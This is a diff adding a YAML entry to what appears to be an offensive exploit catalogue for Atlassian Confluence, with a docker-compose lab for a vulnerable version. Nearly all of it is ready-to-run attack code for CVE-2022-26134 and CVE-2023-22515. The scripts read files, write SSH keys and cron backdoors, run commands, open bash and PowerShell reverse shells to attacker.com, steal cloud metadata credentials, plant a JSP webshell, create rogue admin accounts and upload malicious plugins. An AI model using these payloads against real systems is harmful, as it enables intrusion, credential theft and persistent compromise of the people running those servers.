@@ -1,0 +1,270 @@
+---
+comment: |
+  Atlassian Confluence Server and Data Center is a Java-based team wiki. Two critical
+  unauthenticated vulnerabilities have CISA KEV status:
+
+  1. CVE-2022-26134 (CVSS 9.8, CISA KEV): OGNL expression injection via the HTTP request
+     path. Any HTTP request to a crafted URL evaluates a Java OGNL expression as the
+     Confluence process user, with full access to the Java runtime and HTTP response objects.
+     Affects Confluence Server and Data Center 1.3.0 through 7.18.0.
+
+  2. CVE-2023-22515 (CVSS 10.0, CISA KEV): Broken access control on the /setup endpoint
+     allows an unauthenticated attacker to create a new administrator account.
+     Affects Confluence Data Center and Server 8.0.0 through 8.5.1.
+
+  Confluence does not expose a built-in scripting console. Admin-level RCE requires
+  installing a malicious plugin (JAR/OBR) via Administration > Manage apps > Upload app.
+docker:
+  compose: "services:\n  confluence:\n    image: atlassian/confluence:7.13.6\n   \
+    \ ports:\n      - \"8090:8090\"\n      - \"8091:8091\"\n    environment:\n   \
+    \   ATL_JDBC_URL: jdbc:postgresql://db:5432/confluencedb\n      ATL_JDBC_USER:\
+    \ confluence\n      ATL_JDBC_PASSWORD: confluence\n      ATL_DB_TYPE: postgresql\n\
+    \    depends_on:\n      - db\n  db:\n    image: postgres:13\n    environment:\n\
+    \      POSTGRES_DB: confluencedb\n      POSTGRES_USER: confluence\n      POSTGRES_PASSWORD:\
+    \ confluence\n"
+  note: "Starts Confluence 7.13.6 (vulnerable to CVE-2022-26134 unauthenticated OGNL\
+    \ RCE).\nAccess at `http://localhost:8090`. Complete the setup wizard: select\
+    \ PostgreSQL, host `db`,\ndatabase `confluencedb`, user `confluence`, password\
+    \ `confluence`.\nRun `docker compose up -d && sleep 60` to allow PostgreSQL to\
+    \ initialise.\nThe OGNL injection is active immediately \u2014 setup completion\
+    \ is not required.\n"
+functions:
+  file-read:
+  - code: |
+      # CVE-2022-26134: read a server-side file via OGNL BufferedReader
+      python3 - <<'EOF'
+      import urllib.parse, requests
+
+      TARGET = "http://victim.com:8090"
+      FILE   = "/etc/passwd"
+      # Key targets:
+      # /var/atlassian/application-data/confluence/confluence.cfg.xml  (DB credentials)
+      # /opt/atlassian/confluence/confluence/WEB-INF/web.xml
+      # /proc/1/cmdline  (reveals installation paths)
+
+      ognl = (
+          "${(#a=@org.apache.struts2.ServletActionContext@getResponse())."
+          "(#b=new java.io.BufferedReader(new java.io.FileReader('" + FILE + "')))."
+          "(#c=new java.lang.StringBuilder())."
+          "(#d=#b.readLine())."
+          "(#c.append(#d))."
+          "(#a.getWriter().println(#c))}"
+      )
+      r = requests.get(TARGET + "/" + urllib.parse.quote(ognl, safe=""))
+      print(r.text.strip())
+      EOF
+    comment: |
+      CVE-2022-26134: reads a server-side file via OGNL BufferedReader (returns first line).
+      Extend with a readLine() loop for multi-line files.
+      confluence.cfg.xml contains the database JDBC URL, username, and password in plaintext.
+      /proc/1/cmdline reveals the Java classpath and exact Confluence installation paths.
+    contexts:
+      unauthenticated:
+    version: |
+      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
+  file-write:
+  - code: |
+      # CVE-2022-26134: write arbitrary content to the filesystem via OGNL FileWriter
+      python3 - <<'EOF'
+      import urllib.parse, requests
+
+      TARGET  = "http://victim.com:8090"
+      OUTFILE = "/root/.ssh/authorized_keys"
+      CONTENT = "ssh-ed25519 AAAA...attacker_pubkey... attacker"
+
+      ognl = (
+          "${(#a=@org.apache.struts2.ServletActionContext@getResponse())."
+          "(#b=new java.io.FileWriter('" + OUTFILE + "'))."
+          "(#b.write('" + CONTENT + "'))."
+          "(#b.close())."
+          "(#a.getWriter().print('ok'))}"
+      )
+      r = requests.get(TARGET + "/" + urllib.parse.quote(ognl, safe=""))
+      print(r.text.strip())
+      EOF
+    comment: "CVE-2022-26134: writes arbitrary content to the filesystem via OGNL\
+      \ FileWriter.\nUseful targets:\n- /opt/atlassian/confluence/confluence/<name>.jsp\
+      \  (JSP webshell \u2014 see webshell entry)\n- /root/.ssh/authorized_keys  (SSH\
+      \ persistence when Confluence runs as root)\n- /etc/cron.d/backdoor  (persistent\
+      \ execution via system cron)\nWritability depends on the Confluence process\
+      \ user's filesystem permissions.\n"
+    contexts:
+      unauthenticated:
+    version: |
+      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
+  rce:
+  - code: "# CVE-2022-26134: OGNL injection via HTTP path \u2014 execute command and\
+      \ read output inline\npython3 - <<'EOF'\nimport urllib.parse, requests\n\nTARGET\
+      \  = \"http://victim.com:8090\"\nCOMMAND = \"id\"\n\nognl = (\n    \"${(#a=@org.apache.struts2.ServletActionContext@getResponse()).\"\
+      \n    \"(#b=@java.lang.Runtime@getRuntime().exec(new String[]{\\\"/bin/sh\\\"\
+      ,\\\"-c\\\",\\\"\"\n    + COMMAND + \"\\\"})).\"\n    \"(#c=new java.io.InputStreamReader(#b.getInputStream())).\"\
+      \n    \"(#d=new java.io.BufferedReader(#c)).\"\n    \"(#e=#d.readLine()).\"\n\
+      \    \"(#a.getWriter().println(#e))}\"\n)\nr = requests.get(TARGET + \"/\" +\
+      \ urllib.parse.quote(ognl, safe=\"\"))\nprint(r.text.strip())\nEOF\n"
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2022-26134:\
+      \ Confluence evaluates OGNL expressions embedded in HTTP request paths\nvia\
+      \ an unpatched action dispatcher. No authentication or request body required\
+      \ \u2014\na single GET request delivers and executes the payload.\nCommand output\
+      \ is written directly to the HTTP response body via the response writer.\nFor\
+      \ multi-word commands use /bin/sh -c as shown above.\nRef: https://www.exploit-db.com/exploits/51511\n\
+      Metasploit: use exploit/multi/http/atlassian_confluence_ognl_injection\nnuclei:\
+      \ CVE-2022-26134\n"
+    contexts:
+      unauthenticated:
+    version: |
+      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
+  - code: |
+      # CVE-2023-22515: create an administrator account via the exposed setup endpoint
+      curl -s -X POST "http://victim.com:8090/setup/setupadministrator.action" \
+        -d "username=attacker&fullName=Attacker&email=attacker@evil.com&password=P%40ss0rd1&confirm=P%40ss0rd1&setup-next-button=Next"
+
+      # Verify admin access:
+      curl -s -c /tmp/cf.jar -X POST "http://victim.com:8090/dologin.action" \
+        -d "os_username=attacker&os_password=P%40ss0rd1&login=Log+In&os_destination=%2Fadmin%2Fconsole.action" \
+        -L | grep -i "System Administration"
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2023-22515:\
+      \ Confluence Data Center / Server 8.0.0\u20138.5.1 does not restrict\naccess\
+      \ to the first-run setup endpoint after installation. A single POST to\n/setup/setupadministrator.action\
+      \ creates a new system-administrator account.\nAfter gaining admin access, install\
+      \ a malicious plugin for RCE (see webshell entry)\nor combine with the OGNL\
+      \ file-write entry to drop a JSP webshell.\nRef: https://confluence.atlassian.com/security/cve-2023-22515-frequently-asked-questions-1295682188.html\n\
+      nuclei: CVE-2023-22515\n"
+    contexts:
+      unauthenticated:
+    version: |
+      8.0.0 - 8.5.1
+  - code: |
+      # Install a malicious Confluence plugin JAR containing an RCE servlet
+      # Build with the Atlassian Plugin SDK (atlas-create-confluence-plugin / atlas-package)
+      # Minimal plugin requires atlassian-plugin.xml + a servlet calling Runtime.exec()
+      curl -u "admin:admin" -X POST \
+        "http://victim.com:8090/rest/plugins/1.0/?os_authType=basic" \
+        -H "X-Atlassian-Token: no-check" \
+        -F "plugin=@shell-plugin-1.0.jar;type=application/java-archive"
+
+      # Access the deployed servlet (path matches the servlet-key in atlassian-plugin.xml):
+      curl "http://victim.com:8090/plugins/servlet/shell?c=id"
+    comment: "Confluence does not have a built-in scripting console. Admin-level RCE\
+      \ requires\na plugin (JAR) that registers a servlet calling Runtime.getRuntime().exec().\n\
+      The plugin is hot-deployed \u2014 no server restart required.\nCombine with\
+      \ CVE-2023-22515 to first elevate to admin on unpatched 8.x targets.\nMetasploit:\
+      \ use exploit/multi/http/confluence_widget_connector_macro_rce\n"
+    contexts:
+      admin:
+  reverse-shell:
+  - blind: true
+    code: "# CVE-2022-26134: spawn a reverse bash shell via OGNL Runtime.exec()\n\
+      python3 - <<'EOF'\nimport urllib.parse, requests\n\nTARGET = \"http://victim.com:8090\"\
+      \nLHOST  = \"attacker.com\"\nLPORT  = \"12345\"\n\ncmd  = f\"bash -i >& /dev/tcp/{LHOST}/{LPORT}\
+      \ 0>&1\"\nognl = (\n    \"${@java.lang.Runtime@getRuntime().exec(\"\n    \"\
+      new String[]{\\\"/bin/bash\\\",\\\"-c\\\",\\\"\" + cmd + \"\\\"}\"\n    \")}\"\
+      \n)\nrequests.get(TARGET + \"/\" + urllib.parse.quote(ognl, safe=\"\"))\nprint(f\"\
+      [*] Payload sent \u2014 check listener on {LHOST}:{LPORT}\")\nEOF\n"
+    comment: "CVE-2022-26134: spawns a reverse bash shell via OGNL Runtime.exec()\
+      \ in the URL path.\nThe exec() call is fire-and-forget \u2014 the HTTP response\
+      \ returns immediately.\nThe shell runs as the Confluence process user (commonly\
+      \ confluence or daemon).\n"
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+    version: |
+      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
+  - blind: true
+    code: "# CVE-2022-26134: PowerShell reverse shell for Windows Confluence Server\n\
+      python3 - <<'EOF'\nimport urllib.parse, requests\n\nTARGET = \"http://victim.com:8090\"\
+      \nLHOST  = \"attacker.com\"\nLPORT  = \"12345\"\n\nps = (\n    f'$c=New-Object\
+      \ Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});'\n    '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'\n\
+      \    'while(($i=$s.Read($b,0,$b.Length))-ne 0){'\n    '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'\n\
+      \    '$r=(iex $d 2>&1|Out-String);'\n    '$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}'\n\
+      )\nognl = (\n    \"${@java.lang.Runtime@getRuntime().exec(\"\n    \"new String[]{\\\
+      \"powershell\\\",\\\"-NoP\\\",\\\"-NonI\\\",\\\"-W\\\",\\\"Hidden\\\",\"\n \
+      \   \"\\\"-Exec\\\",\\\"Bypass\\\",\\\"-Command\\\",\\\"\" + ps + \"\\\"}\"\n\
+      \    \")}\"\n)\nrequests.get(TARGET + \"/\" + urllib.parse.quote(ognl, safe=\"\
+      \"))\nprint(f\"[*] Payload sent \u2014 check listener on {LHOST}:{LPORT}\")\n\
+      EOF\n"
+    comment: |
+      CVE-2022-26134: PowerShell reverse shell for Windows Confluence Server deployments.
+      Uses the same OGNL Runtime.exec() injection as the Linux variant.
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: windows
+    tty: false
+    version: |
+      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
+  ssrf:
+  - code: |
+      # CVE-2022-26134: probe internal services via OGNL java.net.URL.openStream()
+      python3 - <<'EOF'
+      import urllib.parse, requests
+
+      TARGET       = "http://victim.com:8090"
+      INTERNAL_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+      ognl = (
+          "${(#a=@org.apache.struts2.ServletActionContext@getResponse())."
+          "(#b=new java.net.URL('" + INTERNAL_URL + "').openStream())."
+          "(#c=new java.io.InputStreamReader(#b))."
+          "(#d=new java.io.BufferedReader(#c))."
+          "(#e=#d.readLine())."
+          "(#a.getWriter().println(#e))}"
+      )
+      r = requests.get(TARGET + "/" + urllib.parse.quote(ognl, safe=""))
+      print(r.text.strip())
+      EOF
+
+      # Cloud metadata endpoints:
+      # AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      # GCP:        http://metadata.google.internal/computeMetadata/v1/
+      # Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    comment: |
+      CVE-2022-26134: java.net.URL.openStream() within OGNL makes outbound HTTP requests
+      from the Confluence host, reaching internal services and cloud metadata endpoints
+      unreachable from the attacker. The first line of the response is returned inline.
+      On patched instances with editor access, the {iframe} or {html} macros (if enabled)
+      can trigger server-side fetching of attacker-controlled URLs.
+    contexts:
+      unauthenticated:
+    version: |
+      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
+  webshell:
+  - code: |
+      # CVE-2022-26134: write a JSP webshell to the Confluence web root via OGNL FileWriter
+      python3 - <<'EOF'
+      import urllib.parse, requests
+
+      TARGET     = "http://victim.com:8090"
+      # Common paths (use file-read to check /proc/1/cmdline for exact location):
+      # Linux package: /opt/atlassian/confluence/confluence/
+      # Docker image:  /opt/atlassian/confluence/confluence/
+      SHELL_PATH = "/opt/atlassian/confluence/confluence/shell.jsp"
+      SHELL_CODE = (
+          '<%@ page import="java.io.*" %>'
+          '<%String c=request.getParameter("c");if(c!=null){'
+          'String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);'
+          'out.print(new String(p.getInputStream().readAllBytes()));'
+          '}%>'
+      )
+      ognl = (
+          "${(#a=@org.apache.struts2.ServletActionContext@getResponse())."
+          "(#b=new java.io.FileWriter('" + SHELL_PATH + "'))."
+          "(#b.write('" + SHELL_CODE.replace("'", "\\'") + "'))."
+          "(#b.close())."
+          "(#a.getWriter().print('ok'))}"
+      )
+      r = requests.get(TARGET + "/" + urllib.parse.quote(ognl, safe=""))
+      print(r.text.strip())
+      print(f"[*] Access at: {TARGET}/shell.jsp?c=id")
+      EOF
+    comment: |
+      CVE-2022-26134: writes a persistent JSP webshell to the Confluence web root via
+      OGNL FileWriter. The JSP is served directly by Confluence's embedded Tomcat.
+      Access at: http://victim.com:8090/shell.jsp?c=id
+      Confirm the exact web root with the file-read entry targeting /proc/1/cmdline.
+    contexts:
+      unauthenticated:
+    version: |
+      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
+...
